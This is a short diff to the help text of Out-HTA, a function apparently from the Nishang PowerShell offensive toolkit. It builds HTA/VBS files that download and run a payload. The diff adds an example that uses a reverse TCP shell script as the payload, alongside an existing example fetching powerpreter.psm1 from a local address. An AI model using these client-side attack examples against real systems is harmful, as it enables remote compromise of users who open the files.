@@ -1,4 +1,4 @@
-﻿
+
 function Out-HTA
 {
 <#
@@ -42,6 +42,12 @@ Use above command to generate HTA and VBS files which download and execute the g
 PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM
 
 Use above command to pass an argument to the PowerShell script/module.
+
+.EXAMPLE
+PS > Out-HTA -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
+
+Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
+you must pass the parameters in the script itself.
 
 .LINK
 http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
@@ -145,3 +151,5 @@ https://github.com/samratashok/nishang
     Out-File -InputObject $HTA -FilePath $HTAFilepath
     Write-Output "HTA written to $HTAFilepath."
 }
+
+
